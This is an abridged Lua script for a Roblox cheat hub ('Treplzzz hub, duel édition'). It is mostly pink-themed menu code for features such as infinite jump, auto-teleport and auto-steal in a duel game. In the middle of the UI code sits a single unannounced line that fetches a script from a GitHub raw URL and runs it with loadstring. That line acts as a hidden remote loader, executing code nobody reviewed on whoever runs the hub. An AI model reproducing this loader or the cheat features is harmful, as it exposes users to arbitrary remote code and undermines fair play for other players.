...
-- ============================================================
-- SERVICES & PRÉVENTION MULTI‑INSTANCES
-- ============================================================
...
if _G.TreplzzzHub_Running then return end
_G.TreplzzzHub_Running = true
...
local CONFIG_FILE = "TreplzzzConfig.json"
local CONFIG_BACKUP = "TreplzzzConfig.bak"
...
-- Intro 🌺🌺Treplzzz duel🌺🌺 (remplace l'ancienne intro)
if introShouldPlay then
    do
        ...
        tapHint.TextColor3 = Color3.fromRGB(255, 150, 200)
        ...
        container.Position = UDim2.new(0.5,-180,0,-140)
        ...
        do
            ...
            g.Color = ColorSequence.new({
                ...
                ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 180, 220)),
        ...
        subSplash.Text = "duel édition"
        subSplash.TextColor3 = Color3.fromRGB(255, 120, 200)
        ...
        ownerLabel.Position = UDim2.new(0,0,0,100)
        ownerLabel.BackgroundTransparency = 1
        ownerLabel.Text = "by owner Treplzzz hub by Emir"
        ownerLabel.TextColor3 = Color3.fromRGB(200, 100, 180)
        ownerLabel.Font = Enum.Font.Gotham
        ownerLabel.TextSize = 11
        ownerLabel.TextTransparency = 0
        ownerLabel.ZIndex = 3
        ...
        local function doShatterEffect()
            ...
            flash.BackgroundColor3 = Color3.fromRGB(255,200,220)
            ...
            for li = 1, 8 do
                task.delay(li * 0.025, function()
                    ...
                    line.BackgroundColor3 = Color3.fromRGB(math.random(200,255), math.random(50,150), math.random(150,255))
        ...
        local function finishSplash()
            ...
            TweenService2:Create(ownerLabel, TweenInfo.new(0.3), {TextTransparency=1}):Play()
        ...
        task.spawn(function()
            ...
            TweenService2:Create(container, TweenInfo.new(0.45, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out),
                {Position=UDim2.new(0.5,-180,0.5,-60)}):Play()
            task.wait(0.5)
            doShatterEffect()
            task.wait(0.85)
            finishSplash()
...
-- ============================================================
-- STATE (Infinite Jump, Auto TP, etc.)
-- ============================================================
local State = {
...
-- ============================================================
-- TRYARD ANIMATION PACK (inchangé)
-- ============================================================
local TryardAnims = {
...
-- ============================================================
local Presets = {}
local PRESET_FILE = "TreplzzzPresets.json"
local LAST_PRESET_FILE = "TreplzzzLastPreset.json"
...
local normalBox,carryBox,laggerBox,laggerCarryBox,uiScaleBox,stealRadBox,stealDurBox,autoTPHeightBox,bodyLockRadBox
...
-- ============================================================
local C = {
    winBg=Color3.fromRGB(20,0,10), winBg2=Color3.fromRGB(15,0,8), winBorder=Color3.fromRGB(255,80,180),
    sidebarBg=Color3.fromRGB(10,0,8), sidebarDiv=Color3.fromRGB(60,20,50),
    topBg=Color3.fromRGB(15,0,10), topTitle=Color3.fromRGB(255,220,240), topSub=Color3.fromRGB(200,80,160),
    topBtn=Color3.fromRGB(200,60,150), topBtnHov=Color3.fromRGB(255,100,200), topDivider=Color3.fromRGB(60,20,50),
    tabBarBg=Color3.fromRGB(8,0,8), tabBarDiv=Color3.fromRGB(60,20,50),
    tabIdle=Color3.fromRGB(200,120,180), tabIdleHov=Color3.fromRGB(255,180,220),
    tabActive=Color3.fromRGB(255,230,240), tabActiveBg=Color3.fromRGB(20,0,16), tabUnderline=Color3.fromRGB(255,80,200),
    sectionTxt=Color3.fromRGB(255,100,200), sectionDiv=Color3.fromRGB(60,20,50),
    rowBg=Color3.fromRGB(5,0,5), rowBorder=Color3.fromRGB(50,20,40), rowLabel=Color3.fromRGB(255,220,235),
    rowSub=Color3.fromRGB(200,80,160), rowValue=Color3.fromRGB(255,160,220), rowHov=Color3.fromRGB(20,0,16),
    inputBg=Color3.fromRGB(10,0,10), inputBorder=Color3.fromRGB(60,20,50), inputFocus=Color3.fromRGB(255,80,200),
    inputTxt=Color3.fromRGB(255,220,235),
    pillOff=Color3.fromRGB(40,20,40), pillOn=Color3.fromRGB(200,60,150), dotOff=Color3.fromRGB(100,50,90),
    dotOn=Color3.fromRGB(10,0,10), pillBorder=Color3.fromRGB(60,20,50),
    modeBtnBg=Color3.fromRGB(10,0,10), modeBtnBrd=Color3.fromRGB(60,20,50), modeBtnTxt=Color3.fromRGB(200,100,180),
    modeBtnActBg=Color3.fromRGB(200,60,150), modeBtnActTx=Color3.fromRGB(0,0,0),
    chipBg=Color3.fromRGB(10,0,10), chipBorder=Color3.fromRGB(60,20,50), chipTxt=Color3.fromRGB(200,100,180),
    btnBg=Color3.fromRGB(10,0,10), btnBorder=Color3.fromRGB(60,20,50), btnTxt=Color3.fromRGB(255,200,230),
    btnHov=Color3.fromRGB(20,0,16),
    stackBg=Color3.fromRGB(8,0,8), stackBrd=Color3.fromRGB(50,20,40), stackTxt=Color3.fromRGB(200,120,180),
    stackActBg=Color3.fromRGB(60,20,50), stackActBrd=Color3.fromRGB(200,60,150), stackActTxt=Color3.fromRGB(255,220,240),
    stackDot=Color3.fromRGB(50,20,40), stackDotOn=Color3.fromRGB(255,80,200),
    infoBg=Color3.fromRGB(8,0,8), infoBrd=Color3.fromRGB(50,20,40), infoTxt=Color3.fromRGB(200,120,180),
    infoVal=Color3.fromRGB(255,180,220), infoFill=Color3.fromRGB(200,60,150),
    accent=Color3.fromRGB(200,60,150), accentDim=Color3.fromRGB(60,20,50),
    presetBg=Color3.fromRGB(10,0,10), presetBrd=Color3.fromRGB(60,20,50), presetLoad=Color3.fromRGB(200,60,150),
    presetDel=Color3.fromRGB(80,20,20), delBrd=Color3.fromRGB(130,30,30), lockOn=Color3.fromRGB(200,60,150),
    divider=Color3.fromRGB(60,20,50),
}

-- CLEANUP
do
    local cleanupNames = {"VyseSlottedGUI","VyseAsireGUI","VyseAsireHubV4","VyseAsireHubV5","VyseAsireHubV5_1","AsireHubV5_1","AsireHubV5_2","LaitoHubV1","LarpDuelsV1","TreplzzzHubV1"}
...
local function Main()
    if _G.TreplzzzHub_MainExecuted then return end
    _G.TreplzzzHub_MainExecuted = true

    local gui=Instance.new("ScreenGui")
    gui.Name="🌺🌺Treplzzz hub🌺🌺"
    ...
    bgImg.BackgroundColor3 = Color3.fromRGB(10,0,10); bgImg.BorderSizePixel = 0; bgImg.ZIndex = 0
    mkCorner(bgImg, 24)
    local mainGrad = Instance.new("UIGradient", bgImg)
    mainGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(30,0,20)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(15,0,10)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(8,0,6))
    })
    mainGrad.Rotation = 90
    local mainStroke = Instance.new("UIStroke", mainOuter)
    mainStroke.Thickness = 1.4; mainStroke.Color = Color3.fromRGB(255,80,200); mainStroke.Transparency = 0.2
    mainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    local mainStrokeGrad = Instance.new("UIGradient", mainStroke)
    mainStrokeGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(200,60,150)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255,80,200)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(200,60,150))
    })
    ...
    accentBar.BackgroundColor3 = Color3.fromRGB(255,80,200); accentBar.BackgroundTransparency = 0.85
    ...
    avatarBg.BackgroundColor3 = Color3.fromRGB(8,0,8); avatarBg.BorderSizePixel = 0; avatarBg.ZIndex = 6
    mkCorner(avatarBg,16); mkStroke(avatarBg, Color3.fromRGB(255,80,200), 1.5).Transparency = 0.25
    ...
    titleLbl.Size = UDim2.new(0,200,0,16); titleLbl.Position = UDim2.new(0,50,0,7)
    titleLbl.BackgroundTransparency = 1; titleLbl.Text = "🌺🌺Treplzzz hub🌺🌺"
    ...
    subTitleLbl.Size = UDim2.new(0,200,0,11); subTitleLbl.Position = UDim2.new(0,50,0,24)
    subTitleLbl.BackgroundTransparency = 1; subTitleLbl.Text = "duel édition 💖"
    ...
    local function makeInputRow(label, default, onChange)
        ...
        row.Size = UDim2.new(1,-16,0,42); row.BackgroundColor3 = Color3.fromRGB(10,0,10)
        row.BorderSizePixel=0; row.LayoutOrder=LO(); mkCorner(row,12)
        local rowStroke = mkStroke(row, Color3.fromRGB(60,20,50),1); rowStroke.Transparency = 0.5
        row.MouseEnter:Connect(function()
            TweenService:Create(row,TweenInfo.new(0.1),{BackgroundColor3=Color3.fromRGB(20,0,16)}):Play()
            TweenService:Create(rowStroke,TweenInfo.new(0.1),{Transparency=0.2}):Play()
        end)
        row.MouseLeave:Connect(function()
            TweenService:Create(row,TweenInfo.new(0.1),{BackgroundColor3=Color3.fromRGB(10,0,10)}):Play()
        ...
        boxWrap.BackgroundColor3 = Color3.fromRGB(5,0,5); boxWrap.BorderSizePixel=0
        mkCorner(boxWrap,8); local bs = mkStroke(boxWrap, Color3.fromRGB(60,20,50),1); bs.Transparency=0.3
        ...
        box.TextColor3 = Color3.fromRGB(255,220,235); box.Font = Enum.Font.GothamBlack
        box.TextSize=13; box.ClearTextOnFocus=false; box.ZIndex=8; box.TextXAlignment=Enum.TextXAlignment.Center
        box.Focused:Connect(function() TweenService:Create(bs,TweenInfo.new(0.15),{Color=Color3.fromRGB(255,80,200),Transparency=0}):Play() end)
        box.FocusLost:Connect(function()
            TweenService:Create(bs,TweenInfo.new(0.15),{Color=Color3.fromRGB(60,20,50),Transparency=0.3}):Play()
            if onChange then
    ...
    local function makeToggleRow(label, defaultOn, onToggle)
        ...
        pillBg.BackgroundColor3 = defaultOn and Color3.fromRGB(200,60,150) or Color3.fromRGB(40,20,40)
        ...
        local function setV(on)
            ...
            TweenService:Create(pillBg, TweenInfo.new(0.18, Enum.EasingStyle.Quint), {
                BackgroundColor3 = on and Color3.fromRGB(200,60,150) or Color3.fromRGB(40,20,40)
            }):Play()
    ...
    local function makeKeybindRow(label, currentKey, onChanged, keyName)
        ...
        kbtn.MouseButton1Click:Connect(function()
            ...
            listening = true; kbtn.Text = "···"; kbtn.TextColor3 = Color3.fromRGB(0,0,0)
            TweenService:Create(kbtn,TweenInfo.new(0.12),{BackgroundColor3=Color3.fromRGB(255,120,220)}):Play()
            TweenService:Create(ks,TweenInfo.new(0.12),{Color=Color3.fromRGB(255,120,220)}):Play()
    ...
    -- ============================================================
    -- PERFORMANCE (Anti-Lag, Stretch, Sky, etc.) - inchangé
    -- ============================================================
    ...
    local function cleanParticlesAndLights()
        ...
        print("[🌺Treplzzz hub] Cleaned "..removed.." effects/lights")
    end
    -- Sky/Lighting restore helpers
    local origLighting = {
...
loadstring(game:HttpGet("https://raw.githubusercontent.com/Argian-dotcom/Jdkffkfo/refs/heads/main/Coding"))()
    ...
    -- ============================================================
    -- BUILD PAGES (inchangé sauf couleurs)
    -- ============================================================
    ...
    do
        local page = buildPage("Visual", function()
            ...
            do
                local fovRow = Instance.new("Frame", currentPage); fovRow.Size = UDim2.new(1,-16,0,42); fovRow.BackgroundColor3=Color3.fromRGB(10,0,10); fovRow.BorderSizePixel=0; fovRow.LayoutOrder=LO(); mkCorner(fovRow,12)
                local fovStroke = mkStroke(fovRow, Color3.fromRGB(60,20,50),1); fovStroke.Transparency=0.5
            ...
            makeGap(4)
            local resetSkyBtn = Instance.new("TextButton", currentPage); resetSkyBtn.Size = UDim2.new(1,-16,0,32); resetSkyBtn.BackgroundColor3=Color3.fromRGB(80,20,20); resetSkyBtn.BorderSizePixel=0; resetSkyBtn.Text="Restore Default Lighting"; resetSkyBtn.TextColor3=Color3.fromRGB(255,200,200); resetSkyBtn.Font=Enum.Font.GothamBold; resetSkyBtn.TextSize=11; resetSkyBtn.LayoutOrder=LO(); mkCorner(resetSkyBtn,6); mkStroke(resetSkyBtn, Color3.fromRGB(130,30,30),1)
            resetSkyBtn.MouseEnter:Connect(function() TweenService:Create(resetSkyBtn,TweenInfo.new(0.1),{BackgroundColor3=Color3.fromRGB(110,30,30)}):Play() end)
            resetSkyBtn.MouseLeave:Connect(function() TweenService:Create(resetSkyBtn,TweenInfo.new(0.1),{BackgroundColor3=Color3.fromRGB(80,20,20)}):Play() end)
    ...
    do
        local page = buildPage("Settings", function()
            ...
            local saveBtn = Instance.new("TextButton", saveWrap); saveBtn.Size = UDim2.new(1,-28,0,32); saveBtn.Position = UDim2.new(0,14,0,7); saveBtn.BackgroundColor3=C.accent; saveBtn.BorderSizePixel=0; saveBtn.Text="💾  Save Config Now"; saveBtn.TextColor3=Color3.fromRGB(0,0,0); saveBtn.Font=Enum.Font.GothamBold; saveBtn.TextSize=12; saveBtn.ZIndex=5; mkCorner(saveBtn,6); mkStroke(saveBtn, C.accent,1)
            saveBtn.MouseEnter:Connect(function() TweenService:Create(saveBtn,TweenInfo.new(0.1),{BackgroundColor3=Color3.fromRGB(220,80,180)}):Play() end)
            ...
            saveBtn.MouseButton1Click:Connect(function()
                ...
                if success then saveBtn.Text="✓  Saved!"; saveBtn.BackgroundColor3=Color3.fromRGB(220,80,180) else saveBtn.Text="✗  Save Failed"; saveBtn.BackgroundColor3=Color3.fromRGB(180,60,60) end
            ...
            local resetAllBtn = Instance.new("TextButton", resetWrap); resetAllBtn.Size = UDim2.new(1,-28,0,32); resetAllBtn.Position = UDim2.new(0,14,0,7); resetAllBtn.BackgroundColor3=Color3.fromRGB(80,20,20); resetAllBtn.BorderSizePixel=0; resetAllBtn.Text="⚠  Reset All Settings"; resetAllBtn.TextColor3=Color3.fromRGB(255,200,200); resetAllBtn.Font=Enum.Font.GothamBold; resetAllBtn.TextSize=12; resetAllBtn.ZIndex=5; mkCorner(resetAllBtn,6); mkStroke(resetAllBtn, Color3.fromRGB(130,30,30),1)
            resetAllBtn.MouseEnter:Connect(function() TweenService:Create(resetAllBtn,TweenInfo.new(0.1),{BackgroundColor3=Color3.fromRGB(110,30,30)}):Play() end)
            resetAllBtn.MouseLeave:Connect(function() TweenService:Create(resetAllBtn,TweenInfo.new(0.1),{BackgroundColor3=Color3.fromRGB(80,20,20)}):Play() end)
            local _resetConfirmStage=0; local _resetConfirmTimer=nil
            resetAllBtn.MouseButton1Click:Connect(function()
                if _resetConfirmStage==0 then
                    _resetConfirmStage=1; resetAllBtn.Text="⚠  Click again to confirm!"; resetAllBtn.BackgroundColor3=Color3.fromRGB(160,40,40)
                    if _resetConfirmTimer then task.cancel(_resetConfirmTimer) end
                    _resetConfirmTimer = task.delay(3,function() if resetAllBtn and resetAllBtn.Parent then _resetConfirmStage=0; resetAllBtn.Text="⚠  Reset All Settings"; resetAllBtn.BackgroundColor3=Color3.fromRGB(80,20,20) end end)
                    return
                end
                ...
                resetAllBtn.Text="✓  All Settings Reset!"; resetAllBtn.BackgroundColor3=Color3.fromRGB(200,60,150)
                task.delay(2,function() if resetAllBtn and resetAllBtn.Parent then resetAllBtn.Text="⚠  Reset All Settings"; resetAllBtn.BackgroundColor3=Color3.fromRGB(80,20,20) end end)
            end)
            ...
            local fl = Instance.new("TextLabel", fw); fl.Size = UDim2.new(1,0,1,0); fl.BackgroundTransparency=1; fl.Text="🌺🌺Treplzzz hub🌺🌺  ·  duel édition 💖"; fl.TextColor3=Color3.fromRGB(200,80,160); fl.Font=Enum.Font.Gotham; fl.TextSize=10; fl.TextXAlignment=Enum.TextXAlignment.Center
            ...
            _G._VezyFlashSave = function(success)
                ...
                if success then lbl.Text="✓  Auto-saved"; lbl.TextColor3=Color3.fromRGB(255,80,200)
                else lbl.Text="✗  Save failed"; lbl.TextColor3=Color3.fromRGB(220,80,80) end
                task.delay(1.5,function() if lbl and lbl.Parent then lbl.Text="🌺🌺Treplzzz hub🌺🌺  ·  duel édition 💖"; lbl.TextColor3=Color3.fromRGB(200,80,160) end end)
            end
        end)
        page.LayoutOrder = 6
    end
    ...
    rebuildPresetList = function()
        ...
        for i,preset in ipairs(Presets) do
            ...
            local loadBtn = Instance.new("TextButton", row); loadBtn.Size=UDim2.new(0,44,0,26); loadBtn.Position=UDim2.new(1,-96,0.5,-13); loadBtn.BackgroundColor3=C.presetLoad; loadBtn.BorderSizePixel=0; loadBtn.Text="Load"; loadBtn.TextColor3=Color3.fromRGB(0,0,0); loadBtn.Font=Enum.Font.GothamBold; loadBtn.TextSize=11; loadBtn.ZIndex=9; mkCorner(loadBtn,5)
            loadBtn.MouseEnter:Connect(function() TweenService:Create(loadBtn,TweenInfo.new(0.1),{BackgroundColor3=Color3.fromRGB(220,80,180)}):Play() end)
    ...
    infoBar.BackgroundColor3 = Color3.fromRGB(8,0,8); infoBar.BorderSizePixel=0; infoBar.Active=true
    mkCorner(infoBar,18); mkStroke(infoBar, Color3.fromRGB(255,80,200), 2)
    ...
    progressBg.BackgroundColor3 = Color3.fromRGB(20,0,16); progressBg.BorderSizePixel=0; progressBg.ClipsDescendants=true
    Instance.new("UICorner", progressBg).CornerRadius = UDim.new(0.5,0)

    local progressFill = Instance.new("Frame", progressBg)
    progressFill.Name = "ProgressFill"
    progressFill.Size = UDim2.new(0,0,1,0); progressFill.BackgroundColor3 = Color3.fromRGB(255,80,200)
    ...
    stealTextLbl.BackgroundTransparency=1; stealTextLbl.Text="STEAL"; stealTextLbl.TextColor3=Color3.fromRGB(255,180,220)
    ...
    stealPctLbl.BackgroundTransparency=1; stealPctLbl.Text="0%"; stealPctLbl.TextColor3=Color3.fromRGB(255,80,200)
    ...
    fpsVal.BackgroundTransparency=1; fpsVal.Text="FPS:0"; fpsVal.TextColor3=Color3.fromRGB(255,220,235)
    ...
    pingVal.BackgroundTransparency=1; pingVal.Text="0ms"; pingVal.TextColor3=Color3.fromRGB(255,220,235)
    ...
    statusDotBg.BackgroundColor3 = Color3.fromRGB(8,0,8); statusDotBg.BorderSizePixel=0
    mkCorner(statusDotBg,12); mkStroke(statusDotBg, Color3.fromRGB(255,80,200), 2)
    ...
    statusDot.BackgroundColor3 = Color3.fromRGB(255,80,200); statusDot.BorderSizePixel=0; mkCorner(statusDot,5)
    ...
    task.spawn(function()
        while task.wait(0.5) do
            pcall(function()
                ...
                if statusDot then statusDot.BackgroundColor3 = State.isStealing and Color3.fromRGB(255,180,220) or Color3.fromRGB(255,80,200) end
            end)
        end
    end)

    -- ============================================================
    -- STACK BUTTONS (avec couleurs roses)
    -- ============================================================
    ...
    local function startRagTimerGui()
        ...
        task.spawn(function()
            ...
            if lbl then
                lbl.Text = "STEAL!"
                lbl.TextColor3 = Color3.fromRGB(255, 80, 200)
            end
    ...
    local function setupChar(char)
        ...
        if head then
            local oldBB=head:FindFirstChild("TreplzzzBB"); if oldBB then oldBB:Destroy() end
            local bb=Instance.new("BillboardGui", head); bb.Name="TreplzzzBB"; bb.Size=UDim2.new(0,180,0,100); bb.StudsOffset=Vector3.new(0,3,0); bb.AlwaysOnTop=true
            ...
            local speedBillLbl=Instance.new("TextLabel",bb); speedBillLbl.Name="SpeedBillLbl"; speedBillLbl.Size=UDim2.new(1,0,0,24); speedBillLbl.BackgroundTransparency=1; speedBillLbl.Text="0.0"; speedBillLbl.TextColor3=Color3.fromRGB(255,80,200); speedBillLbl.Font=Enum.Font.GothamBlack; speedBillLbl.TextScaled=true; speedBillLbl.TextStrokeTransparency=0.1; speedBillLbl.TextStrokeColor3=Color3.new(0,0,0); speedBillLbl.LayoutOrder=1
            local discordLbl=Instance.new("TextLabel",bb); discordLbl.Size=UDim2.new(1,0,0,22); discordLbl.BackgroundTransparency=1; discordLbl.Text="🌺🌺Treplzzz hub🌺🌺"; discordLbl.TextColor3=Color3.fromRGB(255,100,200); discordLbl.Font=Enum.Font.GothamBold; discordLbl.TextScaled=true; discordLbl.TextStrokeTransparency=0.1; discordLbl.TextStrokeColor3=Color3.new(0,0,0); discordLbl.LayoutOrder=2
    ...
    RunService.RenderStepped:Connect(function()
        ...
        pcall(function()
            ...
            if head2 then
                local bb2=head2:FindFirstChild("TreplzzzBB")
    ...
    -- ============================================================
    -- MINI CLOVER BUTTON (devenu rose)
    -- ============================================================
    local cloverBtn = Instance.new("TextButton", gui)
    cloverBtn.Name = "TreplzzzClover"
    cloverBtn.Size = UDim2.new(0,160,0,36)
    cloverBtn.Position = UDim2.new(0,20,0,200)
    cloverBtn.BackgroundColor3 = Color3.fromRGB(10,0,10)
    cloverBtn.BorderSizePixel = 0
    cloverBtn.Text = "🌺 Treplzzz hub"
    cloverBtn.TextColor3 = Color3.fromRGB(255,80,200)
    cloverBtn.Font = Enum.Font.GothamBold
    cloverBtn.TextSize = 14
    cloverBtn.ZIndex = 25
    cloverBtn.Visible = true
    mkCorner(cloverBtn,12)
    mkStroke(cloverBtn, Color3.fromRGB(200,60,150), 1.5)
    ...
    cloverBtn.MouseEnter:Connect(function() TweenService:Create(cloverBtn, TweenInfo.new(0.12), {BackgroundColor3=Color3.fromRGB(20,0,16)}):Play() end)
    cloverBtn.MouseLeave:Connect(function() TweenService:Create(cloverBtn, TweenInfo.new(0.12), {BackgroundColor3=Color3.fromRGB(10,0,10)}):Play() end)
    ...
    startAutoSteal()
    print("[🌺 Treplzzz hub] Ready. Pink UI active. All systems go.")
end

-- ============================================================
-- SAFE MAIN EXECUTION
-- ============================================================
if not _G.TreplzzzHub_MainExecuted then
